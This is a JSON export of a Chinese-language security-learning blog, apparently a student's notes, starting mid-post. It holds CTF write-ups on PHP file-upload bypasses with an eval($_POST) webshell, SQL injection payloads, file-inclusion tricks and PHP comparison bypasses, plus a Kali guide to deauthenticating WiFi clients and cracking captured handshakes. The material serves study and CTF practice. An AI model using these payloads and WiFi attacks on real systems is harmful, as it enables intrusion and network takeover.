$this-&gt;password = $this-&gt;username; } } $user_ser = &apos;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&apos;; var_dump(unserialize($user_ser));运行结果 object(User)#1 (4) { [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; [&quot;password&quot;:&quot;User&quot;:private]=&gt; string(6) &quot;uusama&quot; [&quot;order&quot;:&quot;User&quot;:private]=&gt; NULL }没有定义该类： $user_ser = &apos;O:4:&quot;User&quot;:2:{s:8:&quot;username&quot;;s:6:&quot;uusama&quot;;s:8:&quot;nickname&quot;;s:2:&quot;uu&quot;;}&apos;; var_dump(unserialize($user_ser));运行结果： object(__PHP_Incomplete_Class)#1 (3) { [&quot;__PHP_Incomplete_Class_Name&quot;]=&gt; string(4) &quot;User&quot; [&quot;username&quot;]=&gt; string(6) &quot;uusama&quot; [&quot;nickname&quot;]=&gt; string(2) &quot;uu&quot; }","categories":[],"tags":[]},{"title":"hackergame2019部分题解","slug":"hackergame2019部分题解","date":"2019-10-20T09:48:00.000Z","updated":"2019-10-20T09:49:26.216Z","comments":true,"path":"2019/10/20/hackergame2019部分题解/","link":"","permalink":"http://yoursite.com/2019/10/20/hackergame2019部分题解/","excerpt":"","text":"##签到题：token后面有一个显示按钮，点击显示，token就出来了，复制，打开题目网址，把token放进框里，发现获取flag的按钮无法点击，F12查看元素，把该按钮的属性disabled=”disabled”改为abled=”disabled”，即可获取flag； ##白与夜：打开题目网址，看到一个cat图片，点开图片，what? flag就这样出来了？flag{4_B14CK_C4T} ##信息安全2077：打开题目，提示比赛时间还没开始，Not yet! The competition will start after 21165 days and 54068于是想到了改时间，刚开始有点憨憨的，一直在尝试修改电脑本地的时间日期，一直没改对；哎，怎么没想到，可以用burpsuit直接改包啊！！！刚开始忘了如何打开.txt文件，百度了一下，202.38.93.241:2077/?myfile = fopen(“flag.txt”, “r”) 抓到的包：GET / HTTP/1.1Host: 202.38.93.241:2077User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0 .7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1If-Modified-Since: Sun, 13 Oct 2019 13:34:45 GMTIf-None-Match: “1570973685.0-1234-3182889908”Cache-Control: max-age=0 POST /flag.txt HTTP/1.1Host: 202.38.93.241:2077User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) HEICORE/49.1.2623.213 Safari/537.36Accept: /Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://202.38.93.241:2077/If-Unmodified-Since: Sun, 20 Oct 2019 09:02:49 GMTOrigin: http://202.38.93.241:2077Connection: keep-alivePragma: no-cacheCache-Control: no-cacheContent-Length: 0 一共两个包，把相应的时间都改了，改为2077年，就可以了；","categories":[],"tags":[]},{"title":"第一道文件上传题","slug":"第一道文件上传题","date":"2019-10-09T14:45:30.000Z","updated":"2019-10-10T13:09:31.767Z","comments":true,"path":"2019/10/09/第一道文件上传题/","link":"","permalink":"http://yoursite.com/2019/10/09/第一道文件上传题/","excerpt":"前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊","text":"前段时间简单了解了一下文件上传，学习了常见的绕过方法，Js绕过文件上传、MIME绕过文件上传、拓展名限制上传、大小写绕过文件上传、点，空格绕过文件上传……本以为学习了这些，就能应对大多数文件上传题目，直到做了这第一道文件上传题，才明白原来学的都只是些皮毛，文件上传，博大精深啊 题目地址：https://buuoj.cn/challenges#[SUCTF%202019]CheckIn 拿到这道题，首先把所有学过的绕过方法试一遍，js,本地检验，双写，改写MIME文件类型，php345，点，空格，htaccess文件，结果全都没成功随便上传一个txt文件，提示exif_imagetype:not image! 可知用了exif_imagetype函数判断文件是否是图片文件再试试上传一个图片一句话木马，显示&lt;? in contents! 没上传成功额。。。到这我就无能为力了，知识有限呀 木得办法，只能去看源码了接下来就是与源码斗智斗勇的过程了，php代码好难呀 &lt;?php // error_reporting(0); $userdir = &quot;uploads/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); if (!file_exists($userdir)) { mkdir($userdir, 0777, true); } file_put_contents($userdir . &quot;/index.php&quot;, &quot;&quot;); //file_put_contents将一个字符串写入文件 if (isset($_POST[&quot;upload&quot;])) { $tmp_name = $_FILES[&quot;fileUpload&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;fileUpload&quot;][&quot;name&quot;]; if (!$tmp_name) { die(&quot;filesize too big!&quot;); } if (!$name) { die(&quot;filename cannot be empty!&quot;); } $extension = substr($name, strrpos($name, &quot;.&quot;) + 1); if (preg_match(&quot;/ph|htacess/i&quot;, $extension)) { //匹配正则表达式，文件后缀名中不能含ph、htaccess,/i表示不区分大小写 die(&quot;illegal suffix!&quot;); } if (mb_strpos(file_get_contents($tmp_name), &quot;&lt;?&quot;) !== FALSE) { //mb_strpos 检查字符串在另一个字符串中首次出现的位置 die(&quot;&amp;lt;? in contents!&quot;); //文件中不能包含&lt;? } $image_type = exif_imagetype($tmp_name); //exif_imagetype 检查文件是否是图片类型 可用文件头绕过，如GIF89A if (!$image_type) { die(&quot;exif_imagetype:not image!&quot;); } $upload_file_path = $userdir . &quot;/&quot; . $name; move_uploaded_file($tmp_name, $upload_file_path); echo &quot;Your dir &quot; . $userdir. &apos; &lt;br&gt;&apos;; echo &apos;Your files : &lt;br&gt;&apos;; var_dump(scandir($userdir)); }废了好大劲，才看懂代码，文件后缀名中不能含ph、htaccess，不区分大小写；文件中不能包含&lt;?；exif_imagetype 检查文件是否是图片类型看到了这三个过滤，几乎无望，把我所学的方法全部禁用了，只能去看大佬们怎么绕过的。 上传一个.uset.ini文件，再上传一个aa.jpg文件，然后用菜刀连接 网址/uploads/f4e7685fe689f675c85caeefaedcf40c/index.php连接成功后，cd / 进入根目录 cat flag 拿到flag.user.ini 文件： GIF89a //仅对于本题而言，只是为了绕过检查图片的那个函数 auto_prepend_file=aa.jpg //让php文件后面自动包含aa.jpg这个二年 aa.jpg 文件： GIF89a &lt;script language=’php’ @eval($_POST[‘ye’]); ##.uset.ini在PHP中有个很有趣的东西叫.user.ini，有点类似.htaccess文件，PHP会在每个目录下扫描INI文件，我们可以通过.user.ini文件来实现隐藏后门的效果关于PHP_INI_*一共有四种： PHP_INI_USER 可在用户脚本以及.user.ini中设定 PHP_INI_PERDIR 可在php.ini，.htaccess或httpd.conf中设定 PHP_INI_SYSTEM 可在php.ini或httpd.conf中设定 PHP_INI_ALL 可在任何地方设定php官方文档中说，.user.ini可以设置 PHP_INI_PERDIR 和 PHP_INI_USER ，实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。php配置项中，有两个项，auto_append_file、auto_prepend_fileauto_append_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件。","categories":[],"tags":[]},{"title":"sql注入基础","slug":"sql注入基础","date":"2019-10-03T07:07:13.000Z","updated":"2019-10-11T09:52:51.284Z","comments":true,"path":"2019/10/03/sql注入基础/","link":"","permalink":"http://yoursite.com/2019/10/03/sql注入基础/","excerpt":"","text":"##mysql简单基本用法 以sqli-labs为例查库：select schema_name from information_schemata查表：select tables_name from information_schema.tables where table_schema=’security’查列：select column_name from information_schema.columns where table_name=’users’查字段：select username,password from security.users limit0,1;其中第一位是从第几个开始，比如0代表从第一个开始，而第二位的1代表的就是现实多少个数据。 order by 列数 对这一列排序，列数不正确就报错，可以用来判断列数，字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据 concat(‘‘,A,B) ,有分隔符的地连接字符串，查字段时可用 id=-1’union select 1,2,group_concat(concat_ws(‘‘,username,password)) from security.users –+如此使用，可以把表单里的信息全部列出来，不用像以前一样一一列举 注入时不推荐使用单引号，可用十六进制替代 1.left()函数：left(database(),1)=’s’ left(a,b)函数从左侧截取a的前b位，正确返回1，错误则返回0；2.regexp函数: select user() regexp ‘r’ user()的结果是root,regexp为匹配root的正则表达式3.like函数: select user() like ‘ro%’ 匹配与regexp相似，多了一个%4.substr(a,b,c) select substr() substr(a,b,c)从位置b开始，截取a字符串c为长度5.ascii() 将某个字符串转化为ascii值6.chr(数字)或者是ord(‘字母’) 使用python中的两个函数可以判断当前的ascii值是多少 例：对于security数据库select left(databases(),1)=’s’,前1位是否是sselect database() regexp ‘s’ 匹配第一个字符是否是sselect database() like ‘s%’ 匹配第一个字符是否是sselect substr((select database()),1,1)=’s’ 匹配第一个字符是否是sselect substr((select database()),1,3)=’sec’ 匹配前三个字符是否是secselect ascii(substr((select database()),1,1)) 直接回显115select ascii(substr((select database()),1,1))&gt;110 如果大于110，就会返回1，否则返回0； load_file 读取本地文件 select_load(‘文件路径’);into_outfile 写文件select…..into_outfile ‘file_name’可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有 FILE 权限，才能使用此语法。file_name 不能是一个已经存在的文件。select ‘mysql is very good’ into_outfile ‘test1.txt’; 文件写的路径为默认路径 PHPTutorial\\MySQL\\data或者是select ‘crow 666’ into_outfile ‘文件位置’","categories":[],"tags":[]},{"title":".htaccess文件","slug":"htaccess文件","date":"2019-09-28T07:42:58.000Z","updated":"2019-09-28T07:46:27.198Z","comments":true,"path":"2019/09/28/htaccess文件/","link":"","permalink":"http://yoursite.com/2019/09/28/htaccess文件/","excerpt":".htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。","text":".htaccess文件（或“分布式配置文件”）提供了一种基于每个目录进行配置更改的方法。包含一个或多个配置指令的文件放置在特定的文档目录中，这些指令适用于该目录及其所有子目录。 .htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的 .htaccess可以控制错误重定向，初始页面设置，文件夹的访问权限，文件的跳转等 Nginx如果直接访问，可以下载该文件。如果是apache的话，正常情况下该文件是不可被访问的，但是可以通过php的include之类的文件包含函数进行内容访问 其实最好不要用.htaccess文件，因为目录多了后，每个目录都有个.htaccess很难管理 SetHandler 描述： 强制所有匹配文件由处理程序处理句法： SetHandler handler-name|none|expression语境： 服务器配置，虚拟主机，目录，.htaccess 当放入一个.htaccess文件或 或 部分，该指令将强制所有匹配的文件通过解析处理程序给出 的处理程序名。例如，如果您有一个目录希望完全解析为imagemap规则文件，而不管其扩展名如何，则可以将以下内容放入.htaccess该目录中的 文件中： SetHandler imap文件您也可以使用此伪指令为具有特定文件扩展名的文件配置特定处理程序。例如： &lt; FilesMatch “ \\ .php $” &gt; SetHandler 应用程序/ x-httpd-php &lt;/ FilesMatch &gt; 字符串值表达式可用于引用每个请求变量，包括对已命名正则表达式的反向引用： &lt; LocationMatch ^ / app /（？&lt; sub &gt; [^ /] +）/&gt; SetHandler “ proxy：unix：/ var / run / app_％{env：MATCH_sub} .sock | fcgi：// localhost：8080” &lt;/ 位置匹配&gt; 您可以SetHandler 使用value 覆盖先前定义的指令None。","categories":[],"tags":[]},{"title":"初识文件包含漏洞","slug":"初识文件包含漏洞","date":"2019-09-27T15:33:00.000Z","updated":"2019-09-27T15:42:13.783Z","comments":true,"path":"2019/09/27/初识文件包含漏洞/","link":"","permalink":"http://yoursite.com/2019/09/27/初识文件包含漏洞/","excerpt":"##什么是文件包含？简单的说，为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。","text":"##什么是文件包含？简单的说，为了更好地使用代码的重用性，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。 ##文件包含漏洞的成因是什么？在包含文件的时候，为了灵活包含文件，将被包含文件设置为变量，通过动态变量来引入需要包含的文件时，用户可以对变量的值可控而服务器端未对变量值进行合理地校检或者校检被绕过，这样就导致了文件包含漏洞。通常文件包含函数出现在PHP语言中。&lt;?php $file = $_GET[‘file’]; include($file); //…… ###常见文件包含函数 include include_once require require_once ###文件包含漏洞的利用方式 00截断 长度截断(windows:256,linux:4096) 包含日志文件 包含session ###文件包含漏洞的防御 php中使用open_vasedir配置限制访问在指定的区域 过滤.(点)/(斜杠)(反斜杠) 禁止服务器远程文件包含 尽量不要使用动态包含，可以在需要包含的页面固定写好 ###小例 %00截断 include(“includes/“.$_GET[‘library’].”.php”); 后加.php,改变文件后缀名，用%00截断，遇到%00自动认为字符串结束 点加斜杠绕过 substr($_GET[‘file’], -4, 4) != ‘.php’ 从file变量的倒数第四个开始取值，一直到最后，然后判断是否与.php相等；可用. 或者/.,后加 去后缀名include(‘includes/class_’.addslashes($GET[‘class’]).’.php’);addslashes函数，返回在预定义字符之前添加反斜杠的字符串，预定义字符是：单引号(‘)、双引号(“)、反斜杠()、NULL 双写绕过 $file = str_replace(‘../‘, ‘’, $_GET[‘file’]); 把../用空’’来代替，双写为…/./ 文件包含写shell include($_POST[“page”]); 文件包含post传参时，没办法用菜刀直接连接，可以用执行其他php文件，来写一个一句话木马到服务器上","categories":[],"tags":[]},{"title":"文件上传小结","slug":"文件上传小结","date":"2019-09-22T23:14:11.000Z","updated":"2019-09-22T23:18:43.556Z","comments":true,"path":"2019/09/23/文件上传小结/","link":"","permalink":"http://yoursite.com/2019/09/23/文件上传小结/","excerpt":"","text":"一． 客户端检查Js绕过文件上传二．服务端检查1.检查后缀MIME绕过文件上传拓展名限制上传：大小写绕过文件上传点，空格绕过文件上传.htaccess文件绕过上传Php345文件绕过上传Windows ：：$DATA绕过2.检查内容：文件头检查Getimagesize()函数检查exif_imagetype()函数检查二次渲染 一． ##Js绕过文件上传客户端js检查，通过javascript代码来检测用户提交的文件是否合法，直接本地检测，检测的时候无需与服务器交互，这个时候用burpsuit抓不到包，绕过方法：可以先上传一个符允许的文件后缀，比如，先将原来.php文件改为.jpg文件，上传，抓包，然后在burpsuit上把后缀名改回来二． ##MIME绕过文件上传MIME(Multipurpose Internet Mail Extensions)多用途互联网邮件扩展类型。是设定某种扩展名的文件用一种应用程序来打开的方式类型，当该扩展名文件被访问的时候，浏览器会自动使用指定应用程序来打开。多用于指定一些客户端自定义的文件名，以及一些媒体文件打开方式。与文件上传有关的常见MIME类型.html text/html.txt text/plain.gif image/gif.jpg image/jpeg.png image/png.php application/octet-stream绕过方式：上传一个.php文件，然后用burpsuit抓包，更改MIME类型，改为一个允许的类型，如把原来的Content-Type: application/octet-stream改为image/jpeg ##Windows拓展名限制上传 shell.php. ———-文件名后加点‘.’ shell.php(空格) ———-文件名后加括号空格 shell.php::$DATA ———-文件名后加NTFS ADS特性::$DATA Windows系统会把后缀名中的点、空格、::$DATA等，自动去掉，可以利用这个进行绕过；与Linux相比，windows对大小写不敏感，可以进行大小写绕过，如phP、Php、pHp等 ##Php345文件绕过上传一般来说，服务器能够运行php文件，也能运行php3、php4、php5、phtml文件，并且解析的方式是一样的 ##.htaccess文件绕过上传 .htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 通俗的说，这个文件就是告诉服务器，按哪种方式解析文件，例如：&lt;FilesMatch “.jpg”&gt;SetHandler application/x-httpd-php这段代码，可以告诉服务器，将.jpg文件用php方式解析 2. ##文件内容检查： *有时候，不对后缀名进行检查，而对文件的内容进行检查，常见的有检查文件头、getimagesize()函数、exif_imagetype()函数检查，这个时候需要我们只做图片马，把一句话木马写到图片中，以jpg文件为例，copy tu.jpg/b+yijuhua.php/a tu1.jpgtu.jpg为原图，一句话木马写在yijuhua.php中，tu1.jpg为我们制作出的图片马大多数情况下，图片马都可以绕过文件内容检查；此外，图片马的使用，往往都是与文件包含一起使用。 *二次渲染：就是根据用户上传的图片，新生成一个图片，将原始图片删除，将新图片添加到数据库中。比如一些网站根据用户上传的头像生成大中小不同尺寸的图像。对于gif的二次渲染，我们要找出渲染后图片没变的部分，我们要把一句话代码添加到没变的这部分，一般来说，gif找这个位置相对简单 对于png的二次渲染：png文件组成png图片由3个以上的数据块组成.PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.分析数据块IHDR数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。PLTE调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。IDAT图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像IEND图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：00 00 00 00 49 45 4E 44 AE 42 60 82制作：写入PLTE数据块 在PLTE数据块写入php代码. 计算PLTE数据块的CRCCRC脚本import binasciiimport re png = open(r’2.png’,’rb’)a = png.read()png.close()hexstr = binascii.b2a_hex(a) ‘’’ PLTE crc ‘’’data = ‘504c5445’+ re.findall(‘504c5445(.*?)49444154’,hexstr)[0]crc = binascii.crc32(data[:-16].decode(‘hex’)) &amp; 0xffffffffprint hex(crc) 3.修改CRC值","categories":[],"tags":[]},{"title":"bugku之代码审计","slug":"bugku之代码审计","date":"2019-09-10T08:05:30.000Z","updated":"2019-09-11T09:16:39.588Z","comments":true,"path":"2019/09/10/bugku之代码审计/","link":"","permalink":"http://yoursite.com/2019/09/10/bugku之代码审计/","excerpt":"","text":"#extract变量覆盖 &lt;?php $flag=&apos;xxx&apos;; extract($_GET); if(isset($shiyan)) { $content=trim(file_get_contents($flag)); if($shiyan==$content) { echo&apos;flag{xxx}&apos;; } else { echo&apos;Oh.no&apos;; } } ?&gt;extract函数，从数组中将变量导入到当前的符号表；该函数使用数组简明作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的的一个变量。那么这里的关键点就是shiyan和flag这两个变量了。只要我们让他们一致就ok了我们使用置空的方式让他们的值相等就ok了。flag=&amp;shiyan= #strcmp比较字符串 &lt;?php $flag = &quot;flag{xxxxx}&quot;; if (isset($_GET[&apos;a&apos;])) //isset — 检测变量是否已设置并且非 NULL { if (strcmp($_GET[&apos;a&apos;], $flag) == 0) //如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） die(&apos;Flag: &apos;.$flag); else print &apos;No&apos;; } ?&gt;分析代码，可知只需使变量a等于flag即可输出flag，strcmp()函数只有在相等的情况下返回0。那么我们传入一个数组，它会返回NULL，而判断使用了==，而NULL==0是bool(true)，这样就成功绕过。 #urldecode二次编码绕过 &lt;?php if(eregi(&quot;hackerDJ&quot;,$_GET[id])) { echo(&quot; not allowed! &quot;); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == &quot;hackerDJ&quot;) { echo &quot; Access granted! &quot;; echo &quot; flag &quot;; } ?&gt;若想输出flag，变量id进行一次url编码后等于”hackerDJ”但是，变量id和”hackerDJ”进行正则表达式匹配，id不能等于”hackerDJ”，题目提醒两次url编码，可以使id=%2568ackerDJ浏览器会自动进行一次url编码，%25-&gt;% 此时id=%68ackerDJ第二次编码，%68-&gt;h 此时id=hackerDJ这样就可以绕过得flag #md5()函数 &lt;?php error_reporting(0); $flag = &apos;flag{test}&apos;; if (isset($_GET[&apos;username&apos;]) and isset($_GET[&apos;password&apos;])) { if ($_GET[&apos;username&apos;] == $_GET[&apos;password&apos;]) print &apos;Your password can not be your username.&apos;; else if (md5($_GET[&apos;username&apos;]) === md5($_GET[&apos;password&apos;])) die(&apos;Flag: &apos;.$flag); else print &apos;Invalid password&apos;; } ?&gt;md5()函数遇到数组会返回空，所以可以构造两个数组，这样就有null===null username[]=1&amp;password[]=2#数组返回null绕过 &lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&apos;password&apos;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) //正则表达式匹配 echo &apos;You password must be alphanumeric&apos;; else if (strpos ($_GET[&apos;password&apos;], &apos;--&apos;) !== FALSE) //查找字符串首次出现的位置 die(&apos;Flag: &apos; . $flag); else echo &apos;Invalid password&apos;; } ?&gt;题目提醒，数组时解题关键数组可以绕过ereg()函数，strpos()函数，遇到数组，返回的是nullnull===FALSE不成立，null!==FALSE成立，成功绕过 password[]=1这道题，还可以用%00截断首次这道题要求变量password中不能有除大小写、数字外的字符，下面又用strpos函数，要求password中含有–，读取字符串string时,如果遇到了%00,后面的字符串就不会被解析，故可用password=aA5%00– #弱类型整数大小比较绕过 $temp = $_GET[&apos;password&apos;]; is_numeric($temp)?die(&quot;no numeric&quot;):NULL; if($temp&gt;1336){ echo $flag;首先这道题要求password不能是数字，又要求password大于1336对于弱比较，若字符串以数字开头，则取开头数字作为转换结果，若无则输出0password=1337a #sha()函数比较绕过 &lt;?php $flag = &quot;flag&quot;; if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;])) { var_dump($_GET[&apos;name&apos;]); echo &quot; &quot;; var_dump($_GET[&apos;password&apos;]); var_dump(sha1($_GET[&apos;name&apos;])); var_dump(sha1($_GET[&apos;password&apos;])); if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;]) echo &apos; Your password can not be your name! &apos;; else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;])) //这里传入两个不同的数组就行 die(&apos;Flag: &apos;.$flag); else echo &apos; Invalid password. &apos;; } else echo &apos; Login first! &apos;; ?&gt;md5()与sha1()同样，处理数组时，会返回空 name[]=1&amp;password[]=2 #md5加密相等绕过 &lt;?php $md51 = md5(&apos;QNKCDZO&apos;); $a = @$_GET[&apos;a&apos;]; $md52 = @md5($a); if(isset($a)){ if ($a != &apos;QNKCDZO&apos; &amp;&amp; $md51 == $md52) { echo &quot;flag{*}&quot;; } else { echo &quot;false!!!&quot;; }} else{echo &quot;please input a&quot;;} ?&gt;如果知道MD5碰撞的概念，同时知道了在PHP中的MD5中的0e的比较，这道题目就十分的简单。 如果md的值是以0e开头的，那么就与其他的0e开头的Md5值是相等的。例子如下： md5(‘s878926199a’)=0e545993274517709034328855841020md5(‘s155964671a’)=0e342768416822451524974117254469 //可以看到两者的md5值都是以0e开头的，则 md5(‘s878926199a’)==md5(‘s155964671a’) //就是Truephp关于==号是这样处理的，如果一边是整型，另一边也需要是整型。 ($a != ‘QNKCDZO’ &amp;&amp; $md51 == $md52) 发现 $a != ‘QNKCDZO’ 并且 $md51 == $md52 因为$md51 = md5(‘QNKCDZO’)=0e830400451993494058024219903391 根据上文介绍，我们发现只要满足md5加密后为 “0e***“就可以a=s878926199a参考链接https://blog.csdn.net/qq_42777804/article/details/98512753 #十六进制与数字比较 &lt;?php error_reporting(0); function noother_says_correct($temp) { $flag = &apos;flag{test}&apos;; $one = ord(&apos;1&apos;); //ord — 返回字符的 ASCII 码值 $nine = ord(&apos;9&apos;); //ord — 返回字符的 ASCII 码值 $number = &apos;3735929054&apos;; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) { // Disallow all the digits! $digit = ord($temp{$i}); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) { // Aha, digit not allowed! return &quot;flase&quot;; } } if($number == $temp) return $flag; } $temp = $_GET[&apos;password&apos;]; echo noother_says_correct($temp); ?&gt;首先分析代码，函数要求变量$temp不能存在1~9之间的数字，最后，又要求$temp=3735929054;这本来是自相矛盾的，但php在转码时会把16进制转化为十进制.于是把3735929054转换成16进制为0xdeadc0de #ereg正则%00截断 &lt;?php $flag = &quot;xxx&quot;; if (isset ($_GET[&apos;password&apos;])) { if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE) { echo &apos; You password must be alphanumeric &apos;; } else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999) { if (strpos ($_GET[&apos;password&apos;], &apos;-&apos;) !== FALSE) //strpos — 查找字符串首次出现的位置 { die(&apos;Flag: &apos; . $flag); } else { echo(&apos; - have not been found &apos;); } } else { echo &apos; Invalid password &apos;; } } ?&gt;分析代码，若想得到flag，必须使password中不含非字母数字的字符，password长度小于8，大小大9999999，并且password中还得含有’-‘字符串对比解析，ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析。password=1e8%00- #strpos数组绕过 &lt;?php $flag = &quot;flag&quot;; if (isset ($_GET[&apos;ctf&apos;])) { if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&apos;ctf&apos;]) === FALSE) echo &apos;必须输入数字才行&apos;; else if (strpos ($_GET[&apos;ctf&apos;], &apos;#biubiubiu&apos;) !== FALSE) die(&apos;Flag: &apos;.$flag); else echo &apos;骚年，继续努力吧啊~&apos;; } ?&gt;数组绕过ereg()函数，strpos()函数，这两个函数遇到数组会返回null，null===FALSE,不成立，null!==FALSE成立ctf[]=1 #数字验证正则绕过 &lt;?php error_reporting(0); $flag = &apos;flag{test}&apos;; if (&quot;POST&quot; == $_SERVER[&apos;REQUEST_METHOD&apos;]) { $password = $_POST[&apos;password&apos;]; if (0 &gt;= preg_match(&apos;/^[[:graph:]]{12,}$/&apos;, $password)) //preg_match — 执行一个正则表达式匹配 { echo &apos;flag&apos;; exit; } while (TRUE) { $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) { if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1; } if ($c &lt; 3) break; //&gt;=3，必须包含四种类型三种与三种以上 if (&quot;42&quot; == $password) echo $flag; else echo &apos;Wrong password&apos;; exit; } } ?&gt;","categories":[],"tags":[]},{"title":"kali暴力破解WiFi密码","slug":"kali-暴力破解WiFi密码","date":"2019-08-30T01:04:59.000Z","updated":"2019-08-30T01:30:34.682Z","comments":true,"path":"2019/08/30/kali-暴力破解WiFi密码/","link":"","permalink":"http://yoursite.com/2019/08/30/kali-暴力破解WiFi密码/","excerpt":"","text":"#kali暴力破解WiFi密码 我这里是用的虚拟机，在虚拟机里，无法用笔记本电脑自带的无线网卡（虚拟机里的系统只能用USB外接无线网卡），因此专门买了一个无线网卡首先在终端里执行 airmon-ngcheck kill// 杀死一切干扰无线网卡监听热点的信号 然后载入自已的网卡名，一般都为wlan0 airmon-ng start wlan0 激活无线网卡，此时无线网卡的名称将变为wlan0mon,之前为wlan0 ifconfig -a开始监听周围WiFi热点，显示各个WiFi热点 airdump-ng wlan0mon 接着选择一个目标，开始攻击 airodump-ng -c 频道(ch) –bssid bssid -w /root/hh（用来存储抓包的目录）网卡名（wlan0mon） 当用户与wifi路由器产生数据交换，发送握手包时，我们可以捕获到，但有时长时间用户不与wifi路由器进行交互，不产生握手包，这时，我们可以强制断开用户的wifi，破事用户重新连接，这时就会产生握手包，新建一个终端 airepaly-ng -0 0 -c 连接到WiFi的手机mac地址 -a bssid 网卡名（一般为wlan0mon） (0为用deauth洪水攻击WiFi设备的次数，0为无限，-0 5则攻击5次。攻击原理是：先让设备掉线，设备会再自动连接，并发这个自动连接过程会进行三次握手，会发送tcp包（里面包含加密的密码数据），我方伪装成WiFi热点去窃取该数据包。我方窃取后即可用字典穷举法暴力破解加密的WiFi密码) 最后使用aircrack-ng进行破解 aircrack-ng -w /usr/share/wordlists/rockyou.txt /root/hh-0.1.cap /usr/share/wordlists/rockyou.txt这个是所用密码字典的路径和文件名/root/hh-0.1.cap这个是我们所捕获的握手包的路径和文件名 参考文章：https://blog.csdn.net/qq_41203799/article/details/79945133","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"2019-08-25T10:46:19.649Z","updated":"2019-07-19T07:23:44.181Z","comments":true,"path":"2019/08/25/hello-world/","link":"","permalink":"http://yoursite.com/2019/08/25/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More 